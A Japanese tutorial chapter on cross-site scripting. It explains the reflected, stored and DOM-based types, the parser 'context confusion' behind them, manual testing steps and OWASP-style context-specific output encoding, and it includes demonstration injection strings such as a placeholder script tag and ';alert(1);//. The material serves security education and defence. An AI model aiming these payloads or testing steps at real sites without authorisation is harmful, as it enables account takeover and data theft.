# 第1章 基礎 ― XSSの3分類・実行コンテキスト・発生原理

## XSSとは何か・反射型XSS・学習パス（PortSwigger）

> ℹ️ **本節の資料取得について（透明性のための注記）**: 本節が典拠とする PortSwigger の3ページ（下記URL）は、執筆環境のネットワーク下り（egress）プロキシによって `portswigger.net` への直接アクセスがブロックされたため、ページ本文を直接取得（WebFetch）できませんでした。そこで Web 検索を通じて **同一ページの本文テキスト・具体例・応答スニペット・学習パス一覧を復元**し、専門知識で補完・体系化しています。復元した内容は原文に忠実になるよう努めていますが、原典の最新版で細部（例文の値など）が更新されている可能性があるため、正確な最新の記述は各出典URLでご確認ください。3資料はいずれも実質的内容を復元できたため「取得不可」としては扱っていません。

この節では、XSS（Cross-Site Scripting、クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）の全体像を、PortSwigger の Web Security Academy の3つの基礎資料に沿って体系的に押さえます。読者は「反射型の素朴な XSS は知っている」レベルを想定しているので、単なる分類の暗記ではなく、**「なぜブラウザは攻撃者の文字列をコードとして実行してしまうのか」という仕組みのレベル**まで掘り下げます。これ以降の章（格納型・DOMベース・各種コンテキスト・サニタイザ回避・CSP バイパスなど）の共通土台になる節です。

---

### XSS（クロスサイトスクリプティング）とは何か

XSS は、**攻撃者が「ユーザーと脆弱な Web アプリケーションのやり取り」を乗っ取ることを可能にする Web セキュリティ脆弱性**です。より正確には、攻撃者が用意した JavaScript を、**被害者のブラウザ上で、被害者とアプリケーションのセッションのコンテキスト（文脈・権限）で実行させる**ことができます。

XSS が本質的に危険なのは、ブラウザの根幹的な防御である **同一オリジンポリシー（Same-Origin Policy、SOP＝あるオリジン〔スキーム＋ホスト＋ポートの組〕で動くスクリプトが、別オリジンのデータやDOMに勝手に触れないよう隔離する仕組み）を実質的に回り込んでしまう**点にあります。攻撃者のコードは「別サイトから送り込まれた」ものであっても、いったん脆弱サイトのページ内で実行されると、そのサイト自身のオリジンで動く正規スクリプトとして扱われます。したがって、そのオリジンの Cookie・ローカルストレージ・DOM・進行中のセッションに、正規ページと同じ権限でアクセスできてしまうのです。これが「攻撃者が被害者になりすませる（masquerade as the victim user）」という表現の技術的な意味です。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting

#### XSS が「動く」仕組み（原理）

XSS の核心は次の一文に集約できます。**「XSS は、脆弱な Web サイトを操作して、ユーザーに対して悪意ある JavaScript を返させることで動作する」**（Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users）。悪意あるコードが被害者のブラウザ内で実行された瞬間に、攻撃者はそのユーザーのアプリケーションとのやり取りを完全に侵害できます。

ここで理解すべき原理は **ブラウザの HTML パーサの挙動**です。ブラウザはサーバから受け取った HTML を上から解析（パース）し、`<script>` のようなタグに出会うとその中身を「実行すべきコード」として解釈します。ブラウザは「その文字列が正規の開発者由来なのか、攻撃者が注入したものなのか」を区別できません。**出所ではなく、文字列の構文（syntax）だけを見て解釈する**からです。つまり、ユーザー入力がアプリケーションの応答 HTML の中に **無害化されないまま（エンコード・エスケープされないまま）** 出力され、それがブラウザによって「データ」ではなく「マークアップ／コード」として再解釈されると、XSS が成立します。この「データとして意図された文字列が、パーサによってコードとして再解釈される（context confusion＝文脈の取り違え）」という現象こそが、あらゆる XSS の共通メカニズムです。

---

### XSS で攻撃者は何ができるか（できることの一覧）

XSS が成立すると、攻撃者は被害者ユーザーになりすまし、そのユーザーができることは基本的に何でも実行でき、そのユーザーが見られるデータには何でもアクセスできます。PortSwigger は代表的な悪用を次のように挙げています。

- 被害者ユーザーになりすます／偽装する（impersonate or masquerade as the victim user）。
- 被害者が実行できるあらゆる操作を実行する（carry out any action that the user is able to perform）。
- 被害者がアクセスできるあらゆるデータを読み取る（read any data that the user is able to access）。
- 被害者のログイン認証情報を窃取する（capture the user's login credentials）。例: 偽のログインフォームを注入する、キーストロークを記録する。
- サイトの「見た目上の改ざん（virtual defacement）」を行う。
- サイトにトロイの木馬的な機能を注入する（inject trojan functionality）。

具体的な悪用例としては、被害者のセッショントークン（session token＝ログイン状態を証明する識別子）や認証情報の窃取、被害者になりかわった任意操作の実行、キーロギングなどが典型です。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting

#### 影響の大きさは「コンテキスト依存」である

XSS の実被害の深刻度は、**アプリケーションの性質・機能・扱うデータ・そして侵害されたユーザーの権限**によって大きく変わります。PortSwigger は3段階で説明しています。

- **ブローシャーウェア（brochureware、＝会社案内のような閲覧専用サイト。全ユーザーが匿名で、情報もすべて公開）**では、盗むべきセッションも機微データもないため、影響はしばしば軽微。
- **機微なデータを扱うアプリ**（銀行取引、メール、医療記録など）では、影響は通常「深刻（serious）」。
- **侵害されたユーザーが特権（管理者権限など）を持つ**場合、影響は一般に「致命的（critical）」となり、攻撃者はアプリケーション全体を完全に掌握し、全ユーザーとその全データを侵害しうる。

重要な応用として、**攻撃者が直接アクセスできない内部アプリケーションでも、そこにアクセスできる特権ユーザーを XSS で侵害することで間接的に到達しうる**という点があります（例: 管理者だけが見る内部管理画面に格納型 XSS を仕込み、管理者の閲覧を待つ＝いわゆるブラインド XSS〔blind XSS〕の考え方につながります）。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting

---

### XSS の3分類

XSS は「悪意あるスクリプトが **どこ経由で** 被害者のブラウザに届くか」で3つに大別されます。ここでは全体像を押さえ、反射型は次の大節で深掘りします。

#### 反射型 XSS（Reflected XSS）

アプリケーションが **HTTP リクエストで受け取ったデータを、その場の（immediate）応答の中に、無害化しないまま含めてしまう**ときに発生します。攻撃コードは HTTP リクエスト（URL パラメータなど）に載って送られ、サーバの応答として「反射（reflect）」して返ってきて、その応答を表示した被害者のブラウザで実行されます。攻撃は**サーバに保存されない**ため、被害者に「攻撃者が作った特定のリクエストを送らせる」外部的な仕掛け（悪意あるリンクを踏ませる等）が必要です。3分類の中で最も単純です。

#### 格納型 XSS（Stored XSS、別名 persistent XSS）

アプリケーションが **信頼できない発信元からデータを受け取り、それを後続の HTTP 応答の中に無害化せず含めてしまう**ときに発生します。攻撃コードはサーバ側（データベース、コメント欄、プロフィール、ログなど）に**保存され**、後からそのデータを表示する全ユーザーのブラウザで実行されます。攻撃が**アプリ内で自己完結（self-contained）**する（＝攻撃者は外部誘導を用意せず、脆弱ページに仕込んで被害者が来るのを待つだけ）ため、反射型より影響が大きくなりがちです。

#### DOM ベース XSS（DOM-based XSS）

脆弱性が **サーバ側ではなくクライアント側の JavaScript に存在する**場合です。典型的には、ページ内の JavaScript が **信頼できないソース（source、＝攻撃者が制御しうる入力の入口。例: `location`／URL、`document.cookie`）からデータを取り出し、それを危険なシンク（sink、＝ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`eval()`、`document.write()`）へ、無害化せず渡す**ときに発生します。データがサーバへ往復せず、ブラウザ内で完結して危険なシンクに到達する点が反射型・格納型と異なります。

なお PortSwigger は DOM ベースの派生として次の2つも整理しています（本書では別章で詳述）。

- **Reflected DOM XSS**: サーバがリクエスト中のデータを応答へ反射し、ページ上のスクリプトがその反射データを（例えば JavaScript 文字列リテラルや DOM 内のデータ項目として）受け取って、最終的に危険なシンクへ書き込むもの。
- **Stored DOM XSS**: サーバがあるリクエストのデータを保存し、後の応答に含め、その応答内のスクリプトが危険なシンクで安全でない形で処理するもの。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting
> 出典: What is DOM-based XSS (cross-site scripting)? — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 反射型 XSS の詳細

#### 発生条件（メカニズム）

反射型 XSS は、**アプリケーションが HTTP リクエストでデータを受け取り、そのデータをその場の応答に安全でない形で含める**ときに生じます。ポイントは3つです。

1. 入力が **同一のリクエスト–レスポンスのやり取りの中**で応答に現れる（保存されない）。
2. その入力が **エンコード／エスケープ／フィルタされず**、応答 HTML の中にそのまま置かれる。
3. 置かれた位置（コンテキスト）で、ブラウザがそれを **アクティブコンテンツ（実行対象のマークアップ／スクリプト）として解釈**する。

#### 具体例

検索やステータス表示のように、パラメータの値を応答に埋め込む機能が典型です。PortSwigger の例では、`message` パラメータの値を応答にそのまま埋め込むエンドポイントを想定します。

正常系のリクエストと応答:

```
https://insecure-website.com/status?message=All+is+well
```

```html
<p>Status: All is well.</p>
```

ここでアプリが `message` の値に対して何の処理もしていない場合、攻撃者は次のような URL を組み立てられます。

```
https://insecure-website.com/status?message=<script>/* Bad stuff here... */</script>
```

これに対する応答は次のようになります。

```html
<p>Status: <script>/* Bad stuff here... */</script></p>
```

この URL を **別のユーザーがリクエストすると、攻撃者が供給したスクリプトが、その被害者のブラウザ上で、被害者とアプリケーションのセッションのコンテキストで実行**されます。

> ℹ️ 補足: PortSwigger の資料では検索機能を使った同型の例（`search?term=gift` の値が `<p>You searched for: gift</p>` のように反射され、`term=<script>...</script>` で注入する）も繰り返し用いられます。値をどのタグの中／どの位置に反射するかが異なるだけで、原理は同一です。

##### なぜこのペイロードは動くのか（HTML パーサの再解釈）

`<script>/* Bad stuff here... */</script>` が実行される理由は、**サーバが URL パラメータの値を「テキストデータ」のつもりで `<p>...</p>` の中に連結したのに、ブラウザの HTML パーサはその文字列を上から素直に構文解析し、`<script>` という開始タグを見つけた時点で「ここからはスクリプト要素の中身＝実行すべき JavaScript」と解釈してしまう**からです。つまり、開発者が意図した「データという文脈」と、ブラウザが実際に適用した「スクリプトという文脈」がズレる（前述の context confusion）ために攻撃が成立します。もしサーバが出力時に `<` を `&lt;`、`>` を `&gt;` に HTML エンコードしていれば、ブラウザはそれを「タグの開始」ではなく「小なり記号という文字データ」として表示し、実行は起きません。これが後述の「出力エンコード」が防御の中心になる理由です。

> 出典: What is reflected XSS (cross-site scripting)? — https://portswigger.net/web-security/cross-site-scripting/reflected

#### 反射型 XSS の影響と「配送（delivery）」

攻撃者が被害者のブラウザ上でスクリプトを実行できると、典型的にそのユーザーを完全に侵害できます。反射型に固有の論点は、攻撃者が**自分の用意したリクエストを被害者に発行させる「配送手段」**を外部に用意しなければならない点です。代表的な配送手段は次の通りです。

- 攻撃者が管理する Web サイトにリンクを置く。
- ユーザー生成コンテンツを許可する別サイトにリンクを投稿する。
- メール・SNS・チャットなどのメッセージにリンクを送りつける。

攻撃は既知の特定ユーザーを狙う標的型でも、アプリの任意ユーザーを狙う無差別型でもありえます。**この「外部からの配送が必要」という性質のために、反射型 XSS の影響は一般に格納型より小さい**とされます（格納型は脆弱アプリ内で攻撃が自己完結するため）。

> 出典: What is reflected XSS (cross-site scripting)? — https://portswigger.net/web-security/cross-site-scripting/reflected

#### 反射型 vs 格納型 vs self-XSS

- **反射型 vs 格納型**: 格納型は攻撃者がペイロードをアプリ自体に埋め込み、被害者が遭遇するのを待てばよい（自己完結）。反射型は被害者に細工リクエストを送らせる外部誘導が必須。したがって影響は一般に「格納型 ＞ 反射型」。
- **反射型 vs self-XSS**: self-XSS（セルフXSS）は、反射型と似た挙動だが、細工した URL やクロスドメインのリクエストでは発動せず、**被害者自身が自分のブラウザにペイロードを貼り付ける等、自分で入力したときだけ**発動するものを指す。攻撃成立には、被害者を騙して攻撃者提供の文字列を自分でブラウザに貼らせるソーシャルエンジニアリングが必要になるため、単独では悪用が難しい（＝一般に「脆弱性」として扱う価値が低い）。

> 出典: What is reflected XSS (cross-site scripting)? — https://portswigger.net/web-security/cross-site-scripting/reflected

#### 反射型 XSS の発見・テスト手順（手動）

反射型 XSS を手動で検証する標準的な流れは次の通りです。

1. **すべての入口（entry point）を個別にテストする**: URL クエリ文字列やメッセージボディのパラメータだけでなく、URL のファイルパス、さらには HTTP ヘッダも入口になりうる（ただしヘッダ経由でしか発動しない挙動は実際には悪用困難なこともある）。
2. **ランダムな英数字値を送り、反射を確認する**: 各入口に一意でランダムな短い英数字（およそ8文字程度が目安）を入れ、その値が応答のどこに現れるかを調べる。短めかつ英数字のみにするのは入力バリデーションをすり抜けやすくするため、8文字程度にするのは応答内の偶然の一致を避けるため。Burp Intruder の乱数（hex）ペイロードや grep 設定で、反射箇所を自動的にあぶり出せる。
3. **反射のコンテキストを判定する**: 反射箇所ごとに、値が「タグ間のテキスト」なのか「（引用符付き／なしの）タグ属性値の中」なのか「JavaScript 文字列リテラルの中」なのか等を見極める。**どのコンテキストに落ちるかで必要なペイロードが変わる**（これが本書で繰り返し強調する最重要概念）。
4. **候補ペイロードを試す**: そのコンテキストで JavaScript 実行を引き起こす初期候補を注入し、Burp Repeater で応答を見て効くか確認する。元のランダム値を残したまま、その前後に候補ペイロードを置くと反射位置を素早く特定できる。
5. **代替ペイロードを試す**: 候補が改変・遮断されたら、コンテキストと入力バリデーションの種類に応じて別のペイロード・回避テクニックを試す。
6. **実ブラウザで最終確認する**: Repeater で効きそうなら、実際のブラウザに移して実行を確認する。`alert(document.domain)` のような、成功時に可視のポップアップを出す簡単な JavaScript が便利。

> 出典: What is reflected XSS (cross-site scripting)? — https://portswigger.net/web-security/cross-site-scripting/reflected

#### コンテキストと「バリデーション後の反射」

反射型 XSS には多数のバリエーションがあり、**反射データが応答内のどこに位置するか（コンテキスト）で必要なペイロードの型が決まり、脆弱性の影響も変わりえます**。加えて、反射前にアプリが何らかのバリデーションや加工（一部文字の除去・エスケープ・エンコード）を行っている場合、それがどんなペイロードなら通るかを左右します。だからこそ、反射型を「1つのペイロードを覚えて終わり」にせず、**コンテキスト × 入力処理の組み合わせで考える**必要があります（本書の後続章で各コンテキスト別に詳述します）。

> 出典: What is reflected XSS (cross-site scripting)? — https://portswigger.net/web-security/cross-site-scripting/reflected

---

### XSS の発見・テスト（全般）と PoC のお作法

#### 発見方法（3分類での違い）

- **反射型・格納型**: 大多数は Burp Suite の Web 脆弱性スキャナで高速かつ確実に発見できる。手動では、各入口に一意な入力を送り、応答に現れる全反射箇所を特定し、各箇所で任意 JS を実行できるかを個別に検証する。
- **DOM ベース（URL 由来）**: URL パラメータに一意な入力を入れ、ブラウザの開発者ツールで DOM 内を検索し、その反射箇所が悪用可能かを検証する（反射型と似た流れ）。
- **DOM ベース（URL 以外／非 HTML シンク）**: `document.cookie` のような非 URL ソースや、`setTimeout` のような非 HTML シンクに起因するものは、**JavaScript コードのレビュー以外に確実な発見手段がなく、極めて時間がかかる**。Burp のスキャナは JavaScript の静的解析と動的解析を組み合わせ、この検出を自動化する。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting

#### なぜ PoC に `alert()` を使うのか

XSS の多くは、**自分のブラウザに任意 JavaScript を実行させるペイロードを注入して確認**します。慣習的に `alert()` が使われるのは、短く・無害で・成功時に見逃しようがないからです。PortSwigger のラボの大半も、シミュレートされた被害者のブラウザで `alert()` を呼ばせることで解けます。

ただし技術的な注意点として、**最近の Chrome では、XSS が発生したフレームのオリジンが最上位フレームのオリジンと一致する場合にのみ `alert()` が発火**します。クロスオリジンのフレーム内で XSS が起きるケースでは `alert()` が出ないことがあるため、`print()` を代わりに使う必要がある場面があります。実ブラウザでの最終確認には、成功時にドメインを表示する `alert(document.domain)` のような形も有用です（どのオリジンで実行できたかが一目で分かる）。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting

---

### XSS の防止策

XSS の防止は単純な場合もあれば、アプリの複雑さやユーザー制御データの扱い方次第で非常に難しい場合もあります。PortSwigger は、効果的な防止は次の施策の**組み合わせ**になりうるとしています。

1. **入力を受信時にフィルタする（Filter input on arrival）**: 入力を受け取った時点で、期待される／妥当な入力の形に基づいて可能な限り厳格にフィルタする。**許可リスト（whitelist、許可する文字だけを通す）** を用いるのが原則で、拒否リスト（blacklist）に頼らない。
2. **出力時にデータをエンコードする（Encode data on output）**: ユーザー制御データを HTTP 応答に出力する箇所で、それが**アクティブコンテンツとして解釈されないよう**エンコードする。出力先のコンテキストに応じて、HTML エンコード・URL エンコード・JavaScript エンコード・CSS エンコードを組み合わせて適用する必要がある。
3. **適切なレスポンスヘッダを使う（Use appropriate response headers）**: HTML や JavaScript を含める意図のない応答については、`Content-Type` と `X-Content-Type-Options`（`nosniff`）ヘッダを使い、ブラウザに意図通りの解釈をさせる（＝ブラウザが勝手にコンテンツタイプを推測〔MIME スニッフィング〕して HTML/JS として実行してしまうのを防ぐ）。
4. **Content Security Policy（CSP）を最後の防衛線にする**: それでも残った XSS の**深刻度を下げる**最後の砦として CSP を使う。

補足として、具体的な実装例では、HTML コンテキストには `htmlentities` を `ENT_QUOTES` 付きで用いる、JavaScript コンテキストには JavaScript の Unicode エスケープを用いる、といった**コンテキスト別のエスケープ**が示されます。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting
> 出典: How to prevent XSS — https://portswigger.net/web-security/cross-site-scripting/preventing

#### なぜ「出力エンコード」が中心で、なぜ「コンテキスト依存」なのか（原理）

XSS が「データがコードとして再解釈される」現象である以上、**根本対策は「出力される瞬間に、その出力先の言語（HTML/JS/URL/CSS）にとって危険な文字を、意味を持たない表現へ変換すること」**です。ここで決定的に重要なのは、**同じ文字でも危険かどうかは出力先のコンテキストで変わる**という点です。

- **HTML テキストコンテキスト**（例: `<p>ここ</p>`）では `<` `>` `&` などが危険 → HTML エンティティエンコード（`<` → `&lt;`）で無害化。
- **HTML 属性コンテキスト**（例: `value="ここ"`）では、属性を閉じてしまう引用符（`"` や `'`）が危険 → 属性値をクォートし、クォート文字をエンコードする。
- **JavaScript 文字列コンテキスト**（例: `var x = 'ここ';`）では、文字列を閉じる `'`／`"`、行を壊す改行、`</script>` などが危険 → JavaScript の Unicode エスケープ（例: `'`）を使う。ここで**HTML エンコードを使うのは誤り**で、JS パーサはエンティティを解釈しないため無効になる。
- **URL コンテキスト**（例: `href="ここ"`）では、`javascript:` スキームなどが危険 → URL エンコードに加え、許可スキームの検証が必要。

つまり「1種類のエスケープを全部に適用すれば安全」ではなく、**その値が最終的にどのパーサに食わせられるかを見極めて、対応するエンコードを選ぶ**必要があります。コンテキストを取り違えたエンコード（例: JS 文字列の中身を HTML エンコードだけして済ませる）は、防御になっていないのに「対策済み」に見えるため、実務で頻出する落とし穴です。

#### CSP の位置づけ（最後の防衛線）

CSP（Content Security Policy）は、XSS などの影響を緩和するためのブラウザ機構です。CSP を導入したアプリに XSS 的な挙動が残っていても、CSP がその悪用を妨げる／防ぐことがあります。ただし PortSwigger は、**CSP はしばしば回避（bypass）されて、下層の脆弱性の悪用を許してしまう**とも明言しています。CSP は「出力エンコードの代替」ではなく、あくまで**多層防御の最後の一枚**として位置づけるべきです（CSP のソース許可リストの評価やバイパス手法は本書の CSP 章で詳述します）。

> 出典: What is cross-site scripting (XSS) and how to prevent it? — https://portswigger.net/web-security/cross-site-scripting

---

### 学習パス（PortSwigger Web Security Academy の Learning Paths）

Web Security Academy の **学習パス（learning paths）** は、膨大なトレーニングモジュールとラボを、**体系立てて順番に学べるよう厳選・整理したカリキュラム**です。各パスは複数のトピック／モジュールで構成され、学習者が自分のペースで、初学者から上級者へと段階的に進めるよう設計されています。歴史的には「サーバーサイド脆弱性（apprentice レベルの概観）」と「SQL インジェクション」の2つから始まり、その後拡充されてきました。

Web Security Academy 全体は、難易度タグ（**Apprentice〔修習生〕→ Practitioner〔実務者〕→ Expert〔エキスパート〕**）で各トピック・各ラボが色分けされており、学習パスはこの難易度体系に沿って学ぶ順序を提示してくれます。

検索で確認できた主な学習パス（および対応する URL スラッグ）は次の通りです（一覧は随時拡充されるため、最新・完全な一覧は出典URLでご確認ください）。

- **Server-side vulnerabilities（サーバーサイド脆弱性・Apprentice）** — 一般的なサーバー側脆弱性の概観 — `/web-security/learning-paths/server-side-vulnerabilities-apprentice`
- **SQL injection（SQLインジェクション）** — `/web-security/learning-paths/sql-injection`
- **Authentication vulnerabilities（認証の脆弱性）** — `/web-security/learning-paths/authentication-vulnerabilities`
- **Path traversal（パストラバーサル）** — `/web-security/learning-paths/path-traversal`
- **File upload vulnerabilities（ファイルアップロードの脆弱性）** — `/web-security/learning-paths/file-upload-vulnerabilities`
- **Cross-origin resource sharing (CORS)** — `/web-security/learning-paths/cors`
- **Web cache deception（Web キャッシュ・デセプション）** — `/web-security/learning-paths/web-cache-deception`
- **Web LLM attacks（LLM を狙う Web 攻撃）** — `/web-security/learning-paths/llm-attacks`
- **API testing（API テスト）** — `/web-security/learning-paths/api-testing`

Web Security Academy のトピック区分（学習パスや All topics に対応）は、クライアント側／サーバー側／高度なトピックに大別されます。参考として、以下のように整理されています。

- **サーバーサイド**: SQLインジェクション、認証、ディレクトリトラバーサル（パストラバーサル）、コマンドインジェクション、ビジネスロジックの脆弱性、情報漏洩、アクセス制御、ファイルアップロード、SSRF（サーバーサイドリクエストフォージェリ）、XXE インジェクション。
- **クライアントサイド**: **クロスサイトスクリプティング（XSS）**、CSRF（クロスサイトリクエストフォージェリ）、CORS、クリックジャッキング、DOM ベースの脆弱性、WebSocket。
- **高度なトピック**: 安全でないデシリアライゼーション、サーバーサイドテンプレートインジェクション（SSTI）、Web キャッシュポイズニング、HTTP ホストヘッダ攻撃、HTTP リクエストスマグリング、OAuth 認証、JWT 攻撃、クライアントサイドのプロトタイプ汚染、Essential skills（必須スキル）。

> 出典: Learning paths | Web Security Academy — https://portswigger.net/web-security/learning-paths
> 出典: New learning paths, from the Web Security Academy (Blog) — https://portswigger.net/blog/new-learning-paths-from-the-web-security-academy
> 出典: All Web Security Academy topics — https://portswigger.net/web-security/all-topics

#### XSS を体系的に学ぶための推奨ルート

本書の読者（反射型は知っている中〜上級者）が Web Security Academy を併用するなら、次の順序が効率的です。

1. まず本節の土台（3分類・コンテキスト・出力エンコードの原理）を固める。
2. XSS トピック（`/web-security/cross-site-scripting`）の各コンテキスト別ラボを、Apprentice → Practitioner の順で解く。特に「HTML コンテキスト」「属性コンテキスト」「JavaScript 文字列コンテキスト」でペイロードがどう変わるかを手で確かめる。
3. DOM ベース XSS のトピックで source→sink の追跡に慣れる。
4. CSP、dangling markup injection、XSS→CSRF などの応用ラボへ進み、防御回避と影響拡大を学ぶ。

---

### この節のまとめ

- **XSS とは**、攻撃者の JavaScript を被害者のブラウザで、被害者のセッションのコンテキストで実行させ、同一オリジンポリシーを実質的に回り込む脆弱性である。
- **原理**は一貫して「データとして意図された入力が、ブラウザのパーサによってコード（アクティブコンテンツ）として再解釈される（context confusion）」こと。
- **3分類**は経路の違い（反射型＝リクエストに載せて即応答へ反射、格納型＝サーバに保存され後で配信、DOM ベース＝クライアント JS が source から sink へ危険に渡す）。
- **反射型**は最も単純だが外部からの配送が必要で、影響は一般に格納型より小さい。テストは「入口→反射確認→コンテキスト判定→ペイロード→実ブラウザ確認」の順。
- **影響**はコンテキスト依存（匿名閲覧サイトなら軽微、機微データや特権ユーザーなら致命的）。
- **防御の中心は出力時のコンテキスト別エンコード**。入力フィルタ（許可リスト）、適切なレスポンスヘッダ、CSP（最後の防衛線）を組み合わせる。CSP は代替ではなく補完であり、回避されうる。
- **学習パス**は Apprentice→Practitioner→Expert の段階に沿った厳選カリキュラムで、XSS 学習はコンテキスト別ラボを手で解くのが近道。

---

## OWASP XSS防御チートシート（出力エンコーディングの原理）

反射型XSS（Reflected XSS: 攻撃者が仕込んだスクリプトが、サーバの応答にそのまま反射されて実行される最も素朴な型）の「攻撃」を知っている読者が、次に体系立てて学ぶべきは「防御」の側の原理です。攻撃を防ぐには、なぜXSSが起きるのかという仕組みを、ブラウザのパーサ（HTMLやJavaScriptなどの文字列を解釈して実行可能な構造に変換する処理系）のレベルまで降りて理解する必要があります。このセクションでは、Webセキュリティの世界で事実上の標準的な防御基準として参照されている **OWASP Cross-Site Scripting Prevention Cheat Sheet** を精読し、その中核である「出力エンコーディング（Output Encoding: 危険な文字を、ブラウザに“データ”として扱わせる無害な表現へ変換する処理）」の原理を、なぜそうなるのかまで含めて解説します。

> このセクションの資料（`https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`）は、自動取得の際にネットワーク側のエグレス制限で直接アクセスがブロックされました。ただし、この資料は OWASP が GitHub 上で公開している原本（Markdown）と同一内容であり、そちらを精読して内容を完全に復元しています。したがって本セクションは「取得済み」の資料として記述しています。

---

### 0. まず結論：XSS防御に「銀の弾丸」は存在しない

チートシートは冒頭で、XSS（Cross-Site Scripting: 攻撃者のスクリプトを被害者のブラウザ上で実行させる脆弱性）という名称そのものが「実態を正しく表していない誤称（misnomer）」だと述べます。攻撃の本質は「サイトをまたぐ（cross-site）」ことではなく、「本来データであるべき文字列が、ブラウザによってコード（スクリプト）として解釈・実行されてしまう」点にあるからです。その影響は深刻で、以下が挙げられています。

- アカウントのなりすまし（account impersonation）
- ユーザーの行動の監視（observing user behavior）
- 外部コンテンツの読み込み（loading external content）
- 機微データの窃取（stealing sensitive data）

そのうえでチートシートが最初に強調する結論はこうです。

> 「単一の技術ではXSSは解決できない。適切な防御技術の“組み合わせ”が必要になる（Since no single technique will solve XSS, using the right combination of defensive techniques will be necessary）。」

この「組み合わせ」の柱が、次の3つです。本セクションはこの3本柱を軸に構成します。

1. **フレームワークセキュリティ（Framework Security）** — モダンなWebフレームワークの自動エスケープを正しく使う
2. **出力エンコーディング（Output Encoding）** — フレームワークの保護外で、コンテキストごとに手動でエンコードする
3. **HTMLサニタイズ（HTML Sanitization）** — ユーザーにHTML自体を書かせる場合に、危険なHTMLだけを除去する

さらに、これらを補強する「多層防御（defense-in-depth: 一つの防御が破られても被害を抑えるための、独立した複数の防御層）」として、CSP・Cookie属性・Trusted Types などが位置づけられます。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 1. 最重要の原理：なぜ「コンテキストごと」にエンコードが違うのか

このチートシート全体を貫く最も重要な原理を、先に仕組みのレベルで説明します。ここを理解すれば、以降のルールはすべて「当然の帰結」として腹落ちします。

#### 1.1 ブラウザは1枚のHTMLを「複数の異なるパーサ」で解釈している

ブラウザは、受け取ったHTML文書を単一の解釈規則で読んでいるわけではありません。文書の中の「どの位置か」に応じて、内部で別々のサブパーサ（部分解釈器）へ制御を切り替えます。おおまかに言うと、

- タグとタグの間の本文 → **HTMLパーサ** が読む
- 属性値の中 → **HTML属性パーサ** が読む（読み終えたあと、属性値はさらにその属性の意味に応じて再解釈される）
- `<script>` の中や `on*` イベントハンドラ属性の中 → **JavaScriptパーサ** が読む
- `<style>` の中や `style` 属性の中 → **CSSパーサ** が読む
- `href` / `src` などの値 → **URLパーサ** が読む

つまり、同じ1文字（たとえば `"` や `<` や `'`）でも、それがどのパーサに渡されるかによって「区切り文字（構文的に特別な意味を持つ文字）」になったり、ただのデータ文字になったりします。XSSは、この「特別な意味を持つ文字」を攻撃者が注入し、パーサに“ここからはコードだ”と誤認させることで成立します。

#### 1.2 「HTMLエンコードさえすれば安全」は誤り

ここから、チートシートの最も重要な警告が導かれます。

> 「HTMLエンティティエンコーディングは、`<script>`タグの中、`onmouseover`のようなイベントハンドラ属性の中、CSSの中、URLの中に信頼できないデータを置く場合には“効かない”。したがって、どこでもHTMLエンティティエンコードを使っていたとしても、依然としてXSSに対して脆弱である可能性が非常に高い。」

なぜでしょうか。HTMLエンティティエンコード（`<` を `&lt;` にする等）は「HTMLパーサ」に対してだけ有効な無害化です。しかし `<script>` の中身は、HTMLパーサではなく**JavaScriptパーサ**に渡ります。JavaScriptパーサから見れば `&lt;` はただの文字列であり、そこに注入された `';alert(1);//` のようなJavaScriptの区切り文字（`'` やセミコロン）はまったく無害化されていません。つまり「そのデータが最終的にどのパーサに解釈されるか」に合わせてエンコード方式を選ばなければ、防御は空振りします。

チートシートはこれを次の一文に凝縮しています。

> 「信頼できないデータを置くHTML文書の“その部分”に対応したエンコード構文を、必ず使わなければならない（You MUST use the encode syntax for the part of the HTML document you're putting untrusted data into）。」

これが「コンテキスト別エンコーディング（context-specific output encoding）」という考え方であり、以降の各節はすべて「どのコンテキストなら、どのパーサに合わせて、何をエンコードするか」を定めたものです。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 2. 第一の柱：フレームワークセキュリティ（Framework Security）

チートシートは、開発者が最初に頼るべきはフレームワークだと述べます。モダンなWebフレームワーク（React、Angular、Vue、Lit など）は、テンプレート機能と自動エスケープ機能によって、既定でXSSバグを大幅に減らします。テンプレートに変数を差し込むと、フレームワークが自動的にコンテキストに応じたエスケープを施してくれるためです。

> 「モダンなWebフレームワークで作られたアプリケーションはXSSバグが少ない。しかし、フレームワークが“安全でない使い方”をされると問題が起こりうることを、開発者は知っておく必要がある。」

#### 2.1 各フレームワークの「抜け穴（escape hatch）」

自動エスケープは万能ではなく、各フレームワークには開発者が意図的に自動エスケープを回避できる「抜け穴」が用意されています。ここが典型的なXSSの入口になります。チートシートが挙げる代表例は以下です。

- **React**: `dangerouslySetInnerHTML`（サニタイズせずにHTMLをそのまま挿入する）。また `href` などに `javascript:` / `data:` スキームのURLを渡す処理の不備。
- **Angular**: `bypassSecurityTrustAs*`（`bypassSecurityTrustHtml` など。Angularの組み込みサニタイズを明示的に迂回する関数群）。
- **Lit**: `unsafeHTML`（名前のとおり“安全でないHTML”を挿入するディレクティブ）。
- **Polymer**: `inner-h-t-m-l` 属性、および `htmlLiteral` 関数。
- **テンプレートインジェクション（Template Injection）**: ユーザー入力をテンプレート“文字列そのもの”に混ぜてしまい、テンプレートエンジンにコードとして評価させてしまう問題。

